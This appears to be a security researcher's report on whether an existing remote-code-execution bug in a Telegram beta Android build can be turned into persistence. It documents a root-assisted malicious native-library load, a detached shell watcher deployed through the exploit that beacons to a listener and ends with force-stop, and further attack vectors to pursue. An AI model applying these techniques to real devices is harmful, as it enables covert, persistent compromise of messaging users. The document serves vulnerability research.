# Persistence on 72799: app-data code paths and the force-stop wall (2026-11-01)

Target: `org.telegram.messenger.beta` 13.2.0 (72799), Sony XQ-BT52, Android 13,
UID 10357 (`u0_a357`). Host `<LAN_IP>:5555`.

## Verdict

- **No non-root app-data code-execution path that re-runs on app start was found.**
- The only data→code loader is the native-lib fallback; it is real (proven) but only
  runs if `System.loadLibrary("tmessages.49")` fails. App data cannot cause that
  failure on this install.
- A detached watcher deployed through the existing widget RCE did run as UID 10357
  without root, but `am force-stop` killed it (UID/cgroup cleanup). It does not come
  back after a force-stop restart.
- The old widget UAF was not used for persistence.

## 1. Native-lib fallback — the only by-design data→code path

72799 class: `org.telegram.messenger.ks` (`classes.dex`), method `g(Context)`.
The 72789 equivalent is `org.telegram.messenger.js.g(Context)`.

Order in `ks.g`:

| step | code | line (jadx) |
|---|---|---|
| 1 | `System.loadLibrary("tmessages.49")` | 151 |
| 2 | on `Throwable`/`Error`: `new File(getFilesDir(), "lib")`, `mkdirs()` | 177–180 |
| 3 | `new File(libDir, "libtmessages.49loc.so")` | 182 |
| 4 | if it exists: `System.load(absolutePath)` | 196 |
| 5 | if missing: `k(...)` extracts from the APK, then retry `System.loadLibrary` | 232 |

Why it is not reachable from app data:

- `extractNativeLibs=true`, `primaryCpuAbi=arm64-v8a`.
- Primary path: `/data/app/~~r1vDzV8CpQVWKXLwu8aDPA==/org.telegram.messenger.beta-JVB3quhnKMMIKSJdj4fj2A==/lib/arm64/libtmessages.49.so`.
- `lib/arm64` and the .so are `system:system 755`; UID 10357 cannot rename, delete or
  replace them.
- No preference/file switches the loader to `files/lib`; the fallback is only in the
  `catch` block. `files/lib` did not even exist in the normal state.

Feasibility proof (root-assisted, debug only): moved the APK lib to `.bak`, placed a
raw-syscall arm64 `JNI_OnLoad` .so at `files/lib/libtmessages.49loc.so`. On start:

```
nativeloader: Load libtmessages.49.so ... dlopen failed: library "libtmessages.49.so" not found
System.err: java.lang.UnsatisfiedLinkError: ...
tmessages: Load local lib
nativeloader: Load /data/user/0/.../files/lib/libtmessages.49loc.so ... ok
```

The .so wrote `files/.fallback_proof` (`PWNED\n`, 6 B). Then the app threw
`FATAL EXCEPTION` (the proof .so only implements `JNI_OnLoad`), and the APK lib was
restored. This confirms the candidate is live but root-gated.

## 2. WebView bridges / local HTML — no exec sink

- `org.telegram.ui.web.z0` (BotWebViewContainer): `setAllowFileAccess(false)`,
  `setAllowContentAccess(false)`, `setAllowFileAccessFromFileURLs(false)`,
  `setAllowUniversalAccessFromFileURLs(false)`.
- `org.telegram.ui.web.q1` (WebInstantView): same.
- `org.telegram.ui.r1` (ArticleViewer embed): `setAllowContentAccess(true)` only;
  targetSdk 36 default file access is false.
- JS interfaces are event-only: `TelegramWebviewProxy.postEvent`,
  `BotWebViewContainer$WebViewProxy.postEvent/resolveShare`,
  `YoutubeProxy.postEvent`. No file write, native load or exec.
- Frida startup trace: no `WebView.loadUrl`/`loadDataWithBaseURL` and no local
  HTML/JS from app data at startup.

## 3. Dex / exec / data loaders — none

- No `DexClassLoader`/`InMemoryDexClassLoader`; `y6.h` is an unused
  `PathClassLoader` subclass (no constructor call found).
- `Runtime.exec`/`ProcessBuilder` only for `/system/bin/netcfg`
  (`org.telegram.messenger.o6.b()`).
- `libtmessages.49.so` imports no `system`/`popen`/`exec*`; its `dlopen` sites are
  `libandroid.so` and `libnetd_client.so` only.
- SQLite extension loading is not available (`libsqlite.so`: "not authorized to use
  function"; no `sqlite3_enable_load_extension`).
- Frida startup file trace: app-data opens are prefs, Firebase JSON,
  `files/remote_it.xml` (language pack key/value XML), `files/*.attheme` (theme
  key/value), `PersistedInstallation*.json`; plus the APK lib and `base.odex`.
  No `.js/.html/.qbc/.dex/.jar/.so` from app data.

## 4. Widget sandbox — not a startup path

`sandbox-bundle.js` is evaluated only when a widget view is bound. A cold start on
the chat list produced no `widget tg-widget` engine lines. The bundle is the old
re-exploit route and was excluded by the requirements.

## 5. Detached watcher — deployed, ran as UID 10357, killed by force-stop

Deployment used the existing widget RCE once (v2 1865 payload in message 79449,
`system()` command in `evidence/.../persistence/deploy_cmd.txt`). The command wrote
`files/.p` from base64, then `setsid sh -c 'echo $$ > .p.sup; while :; do sh .p; sleep 2; done'`.

Listener (<LAN_IP>:5555, fresh log) at 23:53:01:

```
WATCHER_HELLO uid=10357 watcher=24426 app_pid=none reason=initial
id -> uid=10357(u0_a357) gid=10357(u0_a357) ... context=u:r:untrusted_app:s0:c101,c257,c512,c768
__PROBE_END__
```

No `su` in `watcher.p`; the process ran as UID 10357.

Force-stop test (`am force-stop` during the benign-DB restore):

- listener `CLOSE conn1` at 23:53:20;
- `/proc/24426` and `/proc/24425` gone;
- `files/.p.log` has no `APP_RESTART`;
- app restarted at 23:53:22 (PID 24563); no new connection.

Root dry run of the **same** script: survived force-stop and reconnected
(`WATCHER_HELLO uid=0 ... app_pid=23311 reason=app_restart`; `.p.log`
`APP_RESTART old=22662 new=23311`). The script logic is fine; the app UID/cgroup is
the problem. `setsid` changes the session, not the cgroup, and Android 13
force-stop kills the app UID's process cgroup.

Note: a detached app-UID shell **does** survive an app **crash** (the original
reverse-shell PoC proved this). It does **not** survive `am force-stop`.

## 6. Next viable vectors

1. Find a no-root way to make the primary `System.loadLibrary("tmessages.49")` fail:
   writable native-lib dir, loader switch in prefs, split/ABI trick, or an early
   preloaded same-soname library. None found in 72799.
2. A second non-root UID with its own cgroup (a separate installed app). Cannot be
   installed by UID 10357 without user/root.
3. A data file parsed at startup that reaches native code. The startup parsers found
   (`remote_it.xml`, `.attheme`) are key/value only; no code path.
4. Root-only (excluded): replace the APK lib, `wrap.<pkg>`, `LD_PRELOAD`.

## Phone state at end

App running (PID 25292), chat list. `cache4.db` md5
`5efe82968ecd885c3df4a0499658e7a6`; 79415 `restored`, 79449 benign. Bundle md5
`0ac9ea50c516271df7519a2d569a71fa`. `files/lib`, `.p*`, `.fallback_proof` removed;
APK lib restored; host listener stopped.

## Artifacts

`evidence/evidence_20261101/persistence/`:
`README.md`, `deployment.txt`, `deploy_cmd.txt`, `watcher.p`, `deploy.html`,
`listener_deploy.log`, `p_watcher.log`, `p_sup.txt`, `root_dryrun.txt`,
`fallback_test.txt`, `libtmessages.49loc.so`, `fallback.S`, `db_state.txt`,
`final_clean.png`.
